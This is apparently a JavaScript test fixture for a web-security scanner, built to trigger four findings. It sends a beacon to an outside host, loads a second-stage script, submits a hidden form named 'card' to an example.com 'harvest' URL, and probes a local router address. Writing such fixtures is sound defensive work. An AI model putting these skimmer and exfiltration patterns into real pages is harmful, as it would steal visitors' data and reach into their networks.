// Armor web test fixture — deliberately bad behavior, run only with ?run=1.
// Every action below maps to a finding the full web test must produce:
//  1. data-send offsite        -> web-data-sent-offsite (high, observed)
//  2. runtime script injection -> web-script-injected-at-runtime (high, observed)
//  3. form submits off-site    -> web-form-sends-offsite (critical, observed)
//  4. local-network reach      -> web-local-network-attempt (critical, shielded)
(function () {
  if (!/[?&]run=1/.test(location.search)) return;
  // 1. Send data to a third host.
  try { navigator.sendBeacon('https://httpbin.org/post', JSON.stringify({ armorFixture: true })); } catch (e) {}
  // 2. Inject a second-stage script from the same outside host.
  setTimeout(function () {
    var s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/gh/ronininc/armor-webtest-fixtures@main/stage2.js';
    document.head.appendChild(s);
  }, 400);
  // 3. Build a form that sends to a different host and submit it.
  setTimeout(function () {
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = 'https://example.com/harvest';
    var i = document.createElement('input');
    i.name = 'card';
    i.value = 'fixture-not-a-real-card';
    f.appendChild(i);
    document.body.appendChild(f);
    if (f.requestSubmit) f.requestSubmit();
  }, 800);
  // 4. Reach for the local network (the test cell must block and report this).
  setTimeout(function () {
    fetch('http://192.168.1.1/').catch(function () {});
  }, 1200);
})();
